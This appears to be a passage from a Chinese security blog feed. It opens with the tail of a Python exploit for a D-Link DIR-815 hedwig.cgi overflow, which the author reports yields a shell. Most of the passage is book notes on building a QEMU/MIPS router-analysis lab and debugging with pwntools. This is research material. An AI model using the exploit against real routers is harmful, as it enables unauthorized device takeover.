class="string">&#x27;100&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;</span><br><span class="line">    ip_port = sys.argv[<span class="number">1</span>]</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip_port + <span class="string">&quot;/hedwig.cgi&quot;</span></span><br><span class="line">    r = requests.post(url=url, headers=header, data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>执行, 成功getshell</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211027202354842.png" alt="image-20211027202354842"></p>]]></content>
    
    
    <summary type="html">D-Link DIR-815 路由器多次溢出漏洞分析</summary>
    
    
    
    <category term="CVE" scheme="http://lantern.cool/categories/CVE/"/>
    
    
    <category term="CVE" scheme="http://lantern.cool/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>《揭秘家用路由器0day漏洞挖掘技术》读书笔记</title>
    <link href="http://lantern.cool/note-book-Router0day/"/>
    <id>http://lantern.cool/note-book-Router0day/</id>
    <published>2021-10-28T17:44:35.000Z</published>
    <updated>2021-10-28T17:44:32.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="《揭秘家用路由器0day漏洞挖掘技术》"><a href="#《揭秘家用路由器0day漏洞挖掘技术》" class="headerlink" title="《揭秘家用路由器0day漏洞挖掘技术》"></a>《揭秘家用路由器0day漏洞挖掘技术》</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VMWare  + Ubuntu18.04 + Python3</span><br><span class="line">WSL + Ubuntu18.04 + Python3</span><br></pre></td></tr></table></figure><h3 id="安装binwalk"><a href="#安装binwalk" class="headerlink" title="安装binwalk"></a>安装binwalk</h3><p>参考: <a href="https://www.howtoinstall.me/ubuntu/18-04/binwalk/">How to Install binwalk in Ubuntu 18.04</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install binwalk</span><br></pre></td></tr></table></figure><h3 id="安装QEMU"><a href="#安装QEMU" class="headerlink" title="安装QEMU"></a>安装QEMU</h3><p>参考: <a href="https://www.howtoinstall.me/ubuntu/18-04/qemu/">How to Install qemu in Ubuntu 18.04</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu</span><br><span class="line">sudo apt install qemu-user-static</span><br><span class="line">sudo apt install qemu-system</span><br></pre></td></tr></table></figure><h3 id="安装binfmt"><a href="#安装binfmt" class="headerlink" title="安装binfmt"></a>安装binfmt</h3><p><a href="https://zh.wikipedia.org/wiki/Binfmt_misc">binfmt_misc - 维基百科，自由的百科全书 (wikipedia.org)</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install binfmt-support</span><br></pre></td></tr></table></figure><h3 id="安装GCC"><a href="#安装GCC" class="headerlink" title="安装GCC"></a>安装GCC</h3><p>参考:</p><ul><li><p><a href="https://linuxize.com/post/how-to-install-gcc-compiler-on-ubuntu-18-04/">How to Install GCC Compiler on Ubuntu 18.04 | Linuxize</a></p></li><li><p><a href="https://stackoverflow.com/questions/22355436/how-to-compile-32-bit-apps-on-64-bit-ubuntu">64 bit - How to Compile 32-bit Apps on 64-bit Ubuntu? - Stack Overflow</a></p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install build-essential</span><br><span class="line">sudo apt install gcc-multilib</span><br></pre></td></tr></table></figure><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT cat hello.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">printf(&quot;Hello World!\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">➜  IOT gcc -m32 hello.c -o hello32 </span><br><span class="line">➜  IOT ./hello32</span><br><span class="line">Hello World!</span><br><span class="line">➜  IOT file hello32</span><br><span class="line">hello32: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=421a37f67f8e04c1c0fc5524e7741a8c44e95f1d, not stripped</span><br><span class="line">➜  IOT gcc hello.c -o hello</span><br><span class="line">➜  IOT ./hello</span><br><span class="line">Hello World!</span><br><span class="line">➜  IOT file hello</span><br><span class="line">hello: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1234f2d2c59244aae4b4a8cc4015da1ee68ba2dd, not stripped</span><br></pre></td></tr></table></figure><h3 id="安装MIPS交叉编译"><a href="#安装MIPS交叉编译" class="headerlink" title="安装MIPS交叉编译"></a>安装MIPS交叉编译</h3><p>书中使用<code>Buildroot</code>搭建交叉编译环境，安装太久，且每一次只能搭建一种交叉编译环境，故换为<code>mipsel-gcc</code>和<code>mips-gcc</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y gcc-mips-linux-gnu</span><br><span class="line">sudo apt-get install -y gcc-mipsel-linux-gnu</span><br></pre></td></tr></table></figure><p>大端使用<code>mips-linux-gnu-gcc</code>命令， 小端使用<code>mipsel-linux-gnu-gcc</code>命令</p><ul><li>用<code>mips-linux-gnu-gcc -EL</code>会报错, 不知道为什么</li></ul><h4 id="测试QEMU与编译环境"><a href="#测试QEMU与编译环境" class="headerlink" title="测试QEMU与编译环境"></a>测试QEMU与编译环境</h4><h5 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT mipsel-linux-gnu-gcc -EL hello.c -o hello_mips_lsb</span><br><span class="line">➜  IOT file hello_mips_lsb </span><br><span class="line">hello_mips_lsb: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, for GNU/Linux 3.2.0, BuildID[sha1]=0866c0f15f5d01e4550ef3d2416f252a290871fe, not stripped</span><br></pre></td></tr></table></figure><h5 id="大端序"><a href="#大端序" class="headerlink" title="大端序"></a>大端序</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT mips-linux-gnu-gcc hello.c -o hello_mips_msb </span><br><span class="line">➜  IOT file hello_mips_msb </span><br><span class="line">hello_mips_msb: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, for GNU/Linux 3.2.0, BuildID[sha1]=86fcd8cb4a3f010b8244c6742eedd8a6576cd82c, not stripped</span><br></pre></td></tr></table></figure><h5 id="静态链接运行"><a href="#静态链接运行" class="headerlink" title="静态链接运行"></a>静态链接运行</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT mips-linux-gnu-gcc -static hello.c -o hello_mips</span><br><span class="line">➜  IOT qemu-mips hello_mips                            </span><br><span class="line">Hello World!</span><br><span class="line">➜  IOT file hello_mips </span><br><span class="line">hello_mips: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=f03bfc54584f5afbfe7925377bde2c7124e73dd2, not stripped</span><br></pre></td></tr></table></figure><h5 id="动态链接运行"><a href="#动态链接运行" class="headerlink" title="动态链接运行"></a>动态链接运行</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT mips-linux-gnu-gcc hello.c -o hello_mips</span><br><span class="line">➜  IOT file hello_mips</span><br><span class="line">hello_mips: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, for GNU/Linux 3.2.0, BuildID[sha1]=999a8168ec52981d21b4b8029ab51521aa6179cc, not stripped</span><br><span class="line">➜  IOT qemu-mips hello_mips</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br></pre></td></tr></table></figure><h6 id="解决方法1"><a href="#解决方法1" class="headerlink" title="解决方法1"></a>解决方法1</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT sudo mkdir /etc/qemu-binfmt</span><br><span class="line">➜  IOT sudo ln -s /usr/mips-linux-gnu /etc/qemu-binfmt/mips</span><br><span class="line">➜  IOT sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mips</span><br></pre></td></tr></table></figure><h6 id="解决方法2"><a href="#解决方法2" class="headerlink" title="解决方法2"></a>解决方法2</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT qemu-mips -L &quot;/usr/mips-linux-gnu&quot; hello_mips</span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><h6 id="解决方法3"><a href="#解决方法3" class="headerlink" title="解决方法3"></a>解决方法3</h6><p>参考:<a href="https://www.giantbranch.cn/2018/04/16/%E4%B8%80%E6%AC%A1qemu%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E8%B7%AF%E7%94%B1%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%AE%B0%E5%BD%95/">一次qemu动态调试路由程序的记录 | giantbranch’s blog</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT cp $(which qemu-mips) ./            </span><br><span class="line">➜  IOT sudo chroot . ./qemu-mips hello_mips</span><br><span class="line">chroot: failed to run command ‘./qemu-mips’: No such file or directory</span><br></pre></td></tr></table></figure><p>需要将依赖库复制到对应目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT ldd qemu-mips </span><br><span class="line">linux-vdso.so.1 (0x00007fffed993000)</span><br><span class="line">libgmodule-2.0.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libgmodule-2.0.so.0 (0x00007fc2abf24000)</span><br><span class="line">libglib-2.0.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0 (0x00007fc2abc0d000)</span><br><span class="line">librt.so.1 =&gt; /lib/x86_64-linux-gnu/librt.so.1 (0x00007fc2aba05000)</span><br><span class="line">libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007fc2ab667000)</span><br><span class="line">libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007fc2ab44f000)</span><br><span class="line">libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fc2ab230000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc2aae3f000)</span><br><span class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fc2aac3b000)</span><br><span class="line">libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fc2aa9c9000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007fc2ae58a000)</span><br></pre></td></tr></table></figure><p>复制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir usr</span><br><span class="line">mkdir usr/lib</span><br><span class="line">mkdir lib</span><br><span class="line">mkdir lib/x86_64-linux-gnu</span><br><span class="line">mkdir lib64</span><br><span class="line">cp /usr/lib/x86_64-linux-gnu/libgmodule-2.0.so.0  ./usr/lib/</span><br><span class="line">cp /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/librt.so.1  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libm.so.6  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libgcc_s.so.1  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libpthread.so.0  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libc.so.6  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libdl.so.2  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib/x86_64-linux-gnu/libpcre.so.3  ./lib/x86_64-linux-gnu</span><br><span class="line">cp /lib64/ld-linux-x86-64.so.2  ./lib64</span><br></pre></td></tr></table></figure><p>继续运行报错</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT sudo chroot ./ ./qemu-mips hello_mips</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br></pre></td></tr></table></figure><p>继续复制到本地对应目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /usr/mips-linux-gnu/lib/ld.so.1 ./lib</span><br><span class="line">cp /usr/mips-linux-gnu/lib/libc.so.6 ./lib</span><br></pre></td></tr></table></figure><p>成功运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT sudo chroot ./ ./qemu-mips hello_mips     </span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><ul><li><code>chroot</code>命令将<code>qemu-mips</code>执行的根目录到当前目录</li></ul><h3 id="MIPS系统网络的配置"><a href="#MIPS系统网络的配置" class="headerlink" title="MIPS系统网络的配置"></a>MIPS系统网络的配置</h3><p>参考: <a href="http://ronpa.top/2018/11/30/qemu%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85/">qemu配置安装 | Ronpa的博客</a></p><p>使用QMU模拟正在运行的MIPS系统, 并配置MIPS系统网络</p><h4 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br></pre></td></tr></table></figure><h4 id="修改-ubuntu主机网络配置"><a href="#修改-ubuntu主机网络配置" class="headerlink" title="修改 ubuntu主机网络配置"></a>修改 ubuntu主机网络配置</h4><p>修改 ubuntu主机网络配置文件<code>/etc/network/interfaces</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>修改为如下内容并保存、关闭</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ubuntu 16.04开始用ens33代替eth0</span></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet manual</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"> </span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_stp off</span><br><span class="line">bridge_maxwait 1</span><br></pre></td></tr></table></figure><ul><li>需要注意的是在ubuntu16.04开始, 原来的 eth0 被重命名为了 ens33。当然了还有一种方法解决这个问题, 将 ens33 修改为原来的 eth0，修改的方法可以参考文档：<a href="https://www.itzgeek.com/how-tos/mini-howtos/change-default-network-name-ens33-to-old-eth0-on-ubuntu-16-04.html">Change default network name (ens33) to old “eth0” on Ubuntu 18.04 / Ubuntu 16.04 (itzgeek.com)</a></li><li>由于使用的是Ubuntu18.04， 故用原书的配置文件会出现网络重启失败，不知原因</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT dmesg |grep eth</span><br><span class="line">[    4.626349] e1000 0000:02:01.0 eth0: (PCI:66MHz:32-bit) 00:0c:29:fe:c6:47</span><br><span class="line">[    4.626364] e1000 0000:02:01.0 eth0: Intel(R) PRO/1000 Network Connection</span><br><span class="line">[    4.627896] e1000 0000:02:01.0 ens33: renamed from eth0</span><br></pre></td></tr></table></figure><h4 id="创建QEMU的网络接口启动脚本"><a href="#创建QEMU的网络接口启动脚本" class="headerlink" title="创建QEMU的网络接口启动脚本"></a>创建QEMU的网络接口启动脚本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/qemu-ifup</span><br></pre></td></tr></table></figure><p>在脚本文件<code>/etc/qemu-ifup</code>中写入如下的内容：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure><ul><li><code>/etc/qemu-ifup</code>文件存在, 为了防止不干扰 <code>/etc/qemu-ifup</code>文件的原来的命令操作 没有修改和删除 <code>/etc/qemu-ifup</code>文件中的原文件内容而是在后面直接添加自己的命令操作的内容</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211014161236714.png" alt="image-20211014161236714"></p><p>保存文件<code>/etc/qemu-ifup</code> 以后，赋予文件<code>/etc/qemu-ifup</code> 可执行权限，然后重启网络使所有的配置生效。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod a+x /etc/qemu-ifup</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启网络使配置生效</span></span><br><span class="line">sudo /etc/init.d/networking restart</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT sudo chmod a+x /etc/qemu-ifup</span><br><span class="line">➜  IOT sudo /etc/init.d/networking restart</span><br><span class="line">[ ok ] Restarting networking (via systemctl): networking.service.</span><br></pre></td></tr></table></figure><h4 id="QEMU启动配置"><a href="#QEMU启动配置" class="headerlink" title="QEMU启动配置"></a>QEMU启动配置</h4><p>启用桥接网络</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  IOT sudo ifdown ens33</span><br><span class="line">➜  IOT sudo ifup br0</span><br><span class="line">ifup: interface br0 already configure</span><br></pre></td></tr></table></figure><p>下载MIPS虚拟机，<a href="https://people.debian.org/~aurel32/qemu/mips/">Index of /~aurel32/qemu/mips (debian.org)</a></p><p>这里选择下载MIPS32小端格式 的虚拟机镜像文件，下载的内核文件为 <code>vmlinux-2.6.32-5-4kc-malta</code> 磁盘镜像文件为 <code>debian_squeeze_mipsel_standard.qcow2</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211014162127341.png" alt="image-20211014162127341"></p><p>下方说明了对应的位数的文件及其启动方式</p><p><img src="Note.assets/image-20211027191307418.png" alt="image-20211027191307418"></p><p>启动<code>qemu</code>运行镜像</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211014163544649.png" alt="image-20211014163544649" style="zoom: 67%;" /><p>或</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap -nographic</span><br></pre></td></tr></table></figure><ul><li><code> -nographic</code> 会直接在当前终端启动，而不是另起终端</li></ul><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211014163703017.png" alt="image-20211014163703017" style="zoom:67%;" /><p>根据提示<code>root</code>的密码都为<code>root</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Both images are 25GiB images in QCOW2 format on which a Debian Squeeze or</span><br><span class="line">Wheezy &quot;Standard system&quot; installation has been performed. The other</span><br><span class="line">installation options are the following:</span><br><span class="line">  - Keyboard:       US</span><br><span class="line">  - Locale:         en_US</span><br><span class="line">  - Mirror:         ftp.debian.org</span><br><span class="line">  - Hostname:       debian-mips</span><br><span class="line">  - Root password:  root</span><br><span class="line">  - User account:   user</span><br><span class="line">  - User password:  user</span><br></pre></td></tr></table></figure><h4 id="配置MIPS系统网络"><a href="#配置MIPS系统网络" class="headerlink" title="配置MIPS系统网络"></a>配置MIPS系统网络</h4><p><code>ifconfig -a</code>发现网络接口没有分配到IP地址</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# ping www.baidu.com</span><br><span class="line">ping: unknown host www.baidu.com</span><br><span class="line">root@debian-mips:~# ifconfig -a</span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01  </span><br><span class="line">          BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:8 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:560 (560.0 B)  TX bytes:560 (560.0 B)</span><br></pre></td></tr></table></figure><p>修改<code>/etc/network/interfaces</code>中的<code>eth0</code>改为<code>eth1</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# nano /etc/network/interfaces</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> This file describes the network interfaces available on your system</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and how to activate them. For more information, see interfaces(5).</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The loopback network interface</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The primary network interface</span></span><br><span class="line">allow-hotplug eth1   # 1</span><br><span class="line">iface eth1 inet dhcp # 2 这两行中的eth0中改为eth1</span><br></pre></td></tr></table></figure><p>将<code>eth1</code>启起来</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifup eth1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# ifconfig</span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01  </span><br><span class="line">          inet addr:192.168.126.131  Bcast:192.168.126.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::216:3eff:fe00:1/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:10 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:1543 (1.5 KiB)  TX bytes:1468 (1.4 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:8 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:560 (560.0 B)  TX bytes:560 (560.0 B)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# ping www.baidu.com -c4</span><br><span class="line">PING www.a.shifen.com (163.177.151.110) 56(84) bytes of data.</span><br><span class="line">64 bytes from 163.177.151.110: icmp_req=1 ttl=128 time=10.3 ms</span><br><span class="line">64 bytes from 163.177.151.110: icmp_req=2 ttl=128 time=8.64 ms</span><br><span class="line">64 bytes from 163.177.151.110: icmp_req=3 ttl=128 time=16.7 ms</span><br><span class="line">64 bytes from 163.177.151.110: icmp_req=4 ttl=128 time=8.70 ms</span><br><span class="line"></span><br><span class="line">--- www.a.shifen.com ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 6067ms</span><br><span class="line">rtt min/avg/max/mdev = 8.643/11.130/16.774/3.335 ms</span><br></pre></td></tr></table></figure><h3 id="Pwntools相关"><a href="#Pwntools相关" class="headerlink" title="Pwntools相关"></a>Pwntools相关</h3><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process([<span class="string">&#x27;qemu-mips&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mips-linux-gnu&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>])</span><br></pre></td></tr></table></figure><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><blockquote><p>这里需要注意的是插件可能会导致 gdbserver crash, 所以用gdb-mularch远程调试没法用插件…..</p></blockquote><p>启用多架构调试需要安装<code>gdb-multiarch</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure><p>使用主要参考: <a href="https://docs.pwntools.com/en/stable/qemu.html">pwnlib.qemu — QEMU Utilities — pwntools 4.6.0 documentation</a></p><p>首先是环境的搭建: </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir /etc/qemu-binfmt</span><br><span class="line">sudo ln -s /usr/mips-linux-gnu /etc/qemu-binfmt/mips</span><br><span class="line">sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel</span><br></pre></td></tr></table></figure><p><code>/etc/qemu-binfmt</code>是<code>pwntools</code>中启动qmeu找lib的路径</p><p>大端: </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pwnlib.qemu.user_path(arch = <span class="string">&quot;mips&quot;</span>)</span><br><span class="line"><span class="string">&#x27;qemu-mips-static&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pwnlib.qemu.ld_prefix(arch = <span class="string">&quot;mips&quot;</span>)</span><br><span class="line"><span class="string">&#x27;/etc/qemu-binfmt/mips&#x27;</span></span><br></pre></td></tr></table></figure><p>小端:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pwnlib.qemu.user_path(arch = <span class="string">&quot;mips&quot;</span>)</span><br><span class="line"><span class="string">&#x27;qemu-mipsel-static&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pwnlib.qemu.ld_prefix(arch = <span class="string">&quot;mips&quot;</span>)</span><br><span class="line"><span class="string">&#x27;/etc/qemu-binfmt/mipsel&#x27;</span></span><br></pre></td></tr></table></figure><p>其中</p><ul><li><code>context.arch</code> : 设置指令集架构</li><li><code>context.endian</code> : 设置大小端，默认小端序</li><li><code>pwnlib.qemu.ld_prefix()</code>: 返回当前选择体系结构的链接路径</li><li><code>pwnlib.qemu.user_path()</code>: 返回当前选择体系结构的qemu-user二进制文件的路径</li></ul><p>然后这样去启动<code>gdb</code>调试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = gdb.debug(<span class="string">&quot;./mips_overflow&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="修复路由器程序运行环境"><a href="#修复路由器程序运行环境" class="headerlink" title="修复路由器程序运行环境"></a>修复路由器程序运行环境</h2><p>D-Link固件下载 <a 